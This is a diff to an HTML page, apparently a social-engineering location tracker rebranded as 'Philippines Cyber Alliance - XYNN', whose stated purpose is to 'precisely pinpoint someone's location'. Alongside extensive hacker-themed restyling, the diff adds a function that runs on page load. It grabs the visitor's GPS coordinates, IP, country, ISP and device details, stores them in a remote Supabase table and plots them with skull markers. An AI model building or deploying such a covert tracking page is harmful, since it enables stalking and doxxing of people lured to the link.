@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Visitor Tracking Map</title>
+    <title>YOU ARE UNDER MY CONTROL</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
@@ -22,8 +22,11 @@
             margin: 0;
             padding: 20px;
             background-color: #000000;
-            color: #00ff00;
+            color: #ff0000;
             font-family: 'Courier New', monospace;
+            background-image: 
+                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.9)),
+                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.1) 2px, rgba(255, 0, 0, 0.1) 4px);
         }
 
         .container {
@@ -32,68 +35,83 @@
         }
 
         h1 {
-            color: #00ff00;
-            font-size: 2em;
+            color: #ff0000;
+            font-size: 2.5em;
             text-align: center;
             margin-bottom: 20px;
-            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 10px #ff0000;
+            letter-spacing: 3px;
+            animation: glitch 2s infinite;
         }
 
         .subtitle {
-            color: #00ff00;
+            color: #ff0000;
             text-align: center;
-            font-size: 0.9em;
+            font-size: 1em;
             margin-bottom: 30px;
+            text-shadow: 0 0 5px #ff0000;
+            letter-spacing: 1px;
         }
 
         #map {
             height: 70vh;
             width: 100%;
-            border: 1px solid #00ff00;
+            border: 2px solid #ff0000;
             margin-bottom: 20px;
             background: #000000;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
         }
 
         .map-modes {
             display: flex;
-            gap: 5px;
+            gap: 10px;
             justify-content: center;
-            margin: 10px 0;
+            margin: 15px 0;
         }
 
         .map-mode-button {
             background-color: #000000;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            padding: 3px 8px;
-            font-size: 11px;
+            color: #ff0000;
+            border: 1px solid #ff0000;
+            padding: 8px 15px;
+            font-size: 12px;
             cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 5px #ff0000;
+            letter-spacing: 1px;
         }
 
         .map-mode-button:hover {
-            background-color: #00ff00;
+            background-color: #ff0000;
             color: #000000;
+            box-shadow: 0 0 15px #ff0000;
         }
 
         .visitor-table {
             width: 100%;
-            border-collapse: collapse;
+            border-collapse: separate;
+            border-spacing: 0;
             margin-top: 20px;
             font-size: 12px;
         }
 
         .visitor-table th, .visitor-table td {
-            border: 1px solid #00ff00;
-            padding: 8px;
+            border: 1px solid #ff0000;
+            padding: 10px;
             text-align: left;
         }
 
         .visitor-table th {
-            background-color: #001100;
+            background-color: rgba(255, 0, 0, 0.1);
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .visitor-table tr:hover {
-            background-color: #001100;
+            background-color: rgba(255, 0, 0, 0.05);
         }
 
         /* Custom map styles */
@@ -104,22 +122,79 @@
         .leaflet-control-layers,
         .leaflet-control-zoom {
             background: #000000 !important;
-            border: 1px solid #00ff00 !important;
-            color: #00ff00 !important;
+            border: 1px solid #ff0000 !important;
+            color: #ff0000 !important;
+        }
+
+        .leaflet-control-zoom a {
+            color: #ff0000 !important;
+            text-shadow: 0 0 5px #ff0000;
         }
 
         .leaflet-control-attribution {
-            background: rgba(0, 0, 0, 0.8) !important;
-            color: #00ff00 !important;
-            font-size: 8px !important;
             display: none !important;
+        }
+
+        #tracking-status {
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 15px 0;
+            min-height: 20px;
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        @keyframes glitch {
+            0% {
+                text-shadow: 0 0 10px #ff0000;
+                transform: translate(0);
+            }
+            20% {
+                text-shadow: -3px 0 #ff0000, 3px 0 #ff0000;
+                transform: translate(-2px, 2px);
+            }
+            40% {
+                text-shadow: 3px 0 #ff0000, -3px 0 #ff0000;
+                transform: translate(2px, -2px);
+            }
+            60% {
+                text-shadow: 0 0 10px #ff0000;
+                transform: translate(0);
+            }
+            100% {
+                text-shadow: 0 0 10px #ff0000;
+                transform: translate(0);
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #000000;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ff3333;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>DEDSEC XICOMAP</h1>
+        <h1>Philippines Cyber Alliance - XYNN</h1>
         <div class="subtitle">PRECISELY PINPOINT SOMEONE'S LOCATION THROUGH THE ART OF SOCIAL ENGINEERING</div>
+        
+        <div id="tracking-status" style="margin-top: 10px; font-size: 14px;"></div>
         
         <div id="map"></div>
 
@@ -214,8 +289,10 @@
             // Load initial data
             tracker.fetchVisitors();
             
-            // Track visitor only once
-            tracker.trackVisitor();
+            // Add click handler for track location button
+            document.getElementById('track-location').addEventListener('click', () => {
+                tracker.trackVisitor();
+            });
 
             // Custom marker icon
             const customIcon = L.divIcon({
@@ -232,6 +309,77 @@
                 iconAnchor: [6, 6]
             });
 
+            // Add this new function to handle visitor tracking
+            async function trackVisitor() {
+                console.log('Starting visitor tracking...');
+                if ("geolocation" in navigator) {
+                    try {
+                        navigator.geolocation.getCurrentPosition(async function(position) {
+                            console.log('Got position:', position);
+                            const lat = position.coords.latitude.toFixed(6);
+                            const lng = position.coords.longitude.toFixed(6);
+
+                            try {
+                                // Get IP info
+                                console.log('Fetching IP info...');
+                                const ipResponse = await fetch('https://ipapi.co/json/');
+                                const ipData = await ipResponse.json();
+                                console.log('IP data:', ipData);
+
+                                // Get device info
+                                const deviceInfo = {
+                                    os: navigator.platform,
+                                    browser: navigator.userAgent,
+                                    deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                                    screen: `${window.screen.width}x${window.screen.height}`
+                                };
+                                console.log('Device info:', deviceInfo);
+
+                                // Save to Supabase
+                                console.log('Saving to Supabase...');
+                                const { data, error } = await tracker.supabase
+                                    .from('visitors')
+                                    .insert([{
+                                        latitude: lat,
+                                        longitude: lng,
+                                        ip_address: ipData.ip,
+                                        country: ipData.country_name,
+                                        isp: ipData.org,
+                                        os: deviceInfo.os,
+                                        browser: deviceInfo.browser,
+                                        device_type: deviceInfo.deviceType,
+                                        screen_resolution: deviceInfo.screen,
+                                        visit_time: new Date().toISOString()
+                                    }]);
+
+                                if (error) throw error;
+
+                                // Add marker to map
+                                const marker = L.marker([lat, lng], {icon: customIcon}).addTo(map);
+                                marker.bindPopup(`
+                                    <div style="color: #00ff00; background: #000; padding: 5px;">
+                                        <strong>Location:</strong> ${lat}, ${lng}<br>
+                                        <strong>IP:</strong> ${ipData.ip}<br>
+                                        <strong>Country:</strong> ${ipData.country_name}<br>
+                                        <strong>ISP:</strong> ${ipData.org}
+                                    </div>
+                                `);
+
+                                // Refresh visitor table
+                                tracker.fetchVisitors();
+                            } catch (error) {
+                                console.error('Error tracking visitor:', error);
+                            }
+                        });
+                    } catch (error) {
+                        console.error('Error tracking visitor:', error);
+                    }
+                }
+            }
+
+            // Call trackVisitor when page loads
+            trackVisitor();
+
             // Add click handlers for table buttons
             document.getElementById('visitor-data').addEventListener('click', function(e) {
                 if (e.target.classList.contains('preview-button')) {
@@ -239,7 +387,62 @@
                     const lat = row.cells[0].textContent;
                     const lng = row.cells[1].textContent;
                     
-                    // Add marker and center map
+                    // Use the same custom icon as in tracker.js
+                    const customIcon = L.divIcon({
+                        html: `
+                            <div class="marker-container">
+                                <div class="marker-dot">☠️</div>
+                                <div class="marker-ripple ripple-1"></div>
+                                <div class="marker-ripple ripple-2"></div>
+                                <div class="marker-ripple ripple-3"></div>
+                            </div>
+                            <style>
+                                .marker-container {
+                                    position: relative;
+                                    width: 20px;
+                                    height: 20px;
+                                    display: flex;
+                                    justify-content: center;
+                                    align-items: center;
+                                }
+                                .marker-dot {
+                                    position: absolute;
+                                    font-size: 20px;
+                                    z-index: 1000;
+                                }
+                                .marker-ripple {
+                                    position: absolute;
+                                    border: 2px solid #ff0000;
+                                    width: 20px;
+                                    height: 20px;
+                                    border-radius: 50%;
+                                    opacity: 0;
+                                }
+                                .ripple-1 {
+                                    animation: ripple 3s infinite ease-out;
+                                }
+                                .ripple-2 {
+                                    animation: ripple 3s infinite ease-out 1s;
+                                }
+                                .ripple-3 {
+                                    animation: ripple 3s infinite ease-out 2s;
+                                }
+                                @keyframes ripple {
+                                    0% {
+                                        transform: scale(1);
+                                        opacity: 0.8;
+                                    }
+                                    100% {
+                                        transform: scale(2.5);
+                                        opacity: 0;
+                                    }
+                                }
+                            </style>`,
+                        className: 'custom-marker',
+                        iconSize: [20, 20],
+                        iconAnchor: [10, 10]
+                    });
+
                     L.marker([lat, lng], {icon: customIcon}).addTo(map);
                     map.setView([lat, lng], 13);
                 }
